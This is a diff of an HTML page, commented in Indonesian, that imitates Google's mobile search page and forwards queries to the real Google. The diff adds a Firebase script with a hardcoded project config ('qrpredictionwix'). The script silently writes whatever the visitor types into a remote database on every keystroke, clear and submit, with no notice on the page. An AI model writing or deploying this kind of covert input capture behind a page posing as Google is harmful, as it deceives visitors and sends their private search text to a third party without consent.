@@ -3,11 +3,14 @@
 <head>
   <meta charset="utf-8" />
   
-  <!-- ==================== PWA META TAGS ==================== -->
+  <!-- ==================== PWA META TAGS & ICONS ==================== -->
   <title>Google</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
-  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" />
-  <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" />
+  
+  <!-- Favicon & App Icon yang baru (High Res) -->
+  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/3840px-Google_%22G%22_logo.svg.png" />
+  <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/3840px-Google_%22G%22_logo.svg.png" />
+  
   <meta name="theme-color" content="#ffffff" />
   <meta name="mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-web-app-capable" content="yes" />
@@ -31,7 +34,6 @@
   </style>
 </head>
 
-<!-- Menggunakan h-[100dvh] dan overflow-hidden agar pas 1 layar penuh tanpa scroll -->
 <body class="h-[100dvh] flex flex-col text-[#202124] overflow-hidden bg-white w-full">
   
   <!-- ==================== HALAMAN UTAMA ==================== -->
@@ -61,7 +63,7 @@
     </div>
   </header>
 
-  <!-- Konten Utama (Berada tepat di tengah layar yang tersisa) -->
+  <!-- Konten Utama -->
   <main class="flex-grow flex flex-col justify-center items-center px-4 w-full pb-[10vh]">
     <img 
       class="w-[180px] sm:w-[272px] object-contain mb-8" 
@@ -93,7 +95,7 @@
     </div>
   </main>
 
-  <!-- Footer (Pasti menempel di bawah) -->
+  <!-- Footer -->
   <footer class="bg-[#f2f2f2] text-[#70757a] text-[14px] flex-shrink-0 w-full">
     <div class="px-5 py-4 border-b border-[#dadce0]">Indonesia</div>
     <div class="flex flex-col items-center py-4 space-y-4">
@@ -118,7 +120,6 @@
         <span class="material-symbols-outlined text-[24px]">arrow_back</span>
       </button>
       
-      <!-- Input dibungkus form agar tombol enter keyboard HP berfungsi sebagai Submit -->
       <form id="search-form" action="https://www.google.com/search" method="GET" class="flex-grow mx-2 flex items-center">
         <input id="active-search-input" name="q" type="text" class="w-full text-[16px] text-[#202124] focus:outline-none bg-transparent" autocomplete="off" />
       </form>
@@ -140,13 +141,37 @@
     </div>
 
     <!-- Daftar Saran & Riwayat -->
-    <div id="suggestions-list" class="flex-grow overflow-y-auto bg-white pt-2">
-      <!-- Item dimuat dengan JavaScript -->
-    </div>
+    <div id="suggestions-list" class="flex-grow overflow-y-auto bg-white pt-2"></div>
   </div>
 
-  <!-- ==================== LOGIK JAVASCRIPT ==================== -->
-  <script>
+  <!-- ==================== LOGIK JAVASCRIPT & FIREBASE ==================== -->
+  <script type="module">
+    // Import Firebase SDK dari CDN resmi Google
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-database.js";
+
+    // Konfigurasi Firebase dari pengguna
+    const firebaseConfig = {
+      apiKey: "AIzaSyBsdaCltUZPkg0kl7-BIY-xfbkTnypyfxM",
+      authDomain: "qrpredictionwix.firebaseapp.com",
+      databaseURL: "https://qrpredictionwix-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "qrpredictionwix",
+      storageBucket: "qrpredictionwix.firebasestorage.app",
+      messagingSenderId: "1045444279571",
+      appId: "1:1045444279571:web:02a98dec1d28c743d9aee6"
+    };
+
+    // Inisialisasi Firebase & Realtime Database
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // Fungsi untuk memperbarui data ke 'predictions/input' di Firebase
+    function updateFirebaseInput(text) {
+      set(ref(db, 'predictions/input'), text)
+        .catch((error) => console.error("Firebase update failed:", error));
+    }
+
+    // DOM Elements
     const mainSearchTrigger = document.getElementById('main-search-trigger');
     const mainDisplayInput = document.getElementById('main-display-input');
     const searchOverlay = document.getElementById('search-overlay');
@@ -178,16 +203,14 @@
       renderHistory(); 
     }
 
-    // Aksi untuk melakukan pencarian & Redirect
     function executeSearch(query) {
       saveToHistory(query);
-      // Redirect ke halaman Google Search yang sebenarnya
+      updateFirebaseInput(query); // Kirim kata kunci final sebelum redirect
       window.location.href = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
     }
 
-    // Submit form (Saat tekan "Enter" atau tombol "Go" di Keyboard)
     searchForm.addEventListener('submit', (e) => {
-      e.preventDefault(); // Cegah reload bawaan form
+      e.preventDefault();
       if (activeInput.value.trim() !== '') {
         executeSearch(activeInput.value);
       }
@@ -221,7 +244,6 @@
       renderListHTML(items, '');
     }
 
-    // Membuat HTML list (Saran & Riwayat)
     function renderListHTML(items, currentQuery) {
       suggestionsList.innerHTML = '';
 
@@ -250,12 +272,10 @@
           </span>
         `;
         
-        // Event klik teks -> Redirect
         div.querySelector('.flex-grow').addEventListener('click', () => {
           executeSearch(item.text);
         });
 
-        // Event klik ikon panah serong atau silang
         div.querySelector('.right-action-btn').addEventListener('click', (e) => {
           e.stopPropagation();
           if (item.type === 'history') {
@@ -265,6 +285,7 @@
             activeInput.focus();
             fetchGoogleSuggestions(activeInput.value);
             toggleIcons(activeInput.value);
+            updateFirebaseInput(activeInput.value); // Kirim teks ke firebase saat panah ditekan
           }
         });
 
@@ -301,19 +322,27 @@
       searchOverlay.classList.remove('flex');
     }
 
+    // Event Listeners
     mainSearchTrigger.addEventListener('click', openOverlay);
     backBtn.addEventListener('click', closeOverlay);
 
+    // Hapus input dan reset database firebase
     clearBtn.addEventListener('click', () => {
       activeInput.value = '';
       activeInput.focus();
       toggleIcons('');
       renderHistory();
+      updateFirebaseInput(''); // Hapus di firebase juga
     });
 
+    // Mengetik di kotak pencarian
     let timeoutId;
     activeInput.addEventListener('input', (e) => {
       const query = e.target.value;
+      
+      // Update Firebase secara real-time saat ngetik
+      updateFirebaseInput(query);
+      
       toggleIcons(query);
       
       clearTimeout(timeoutId);
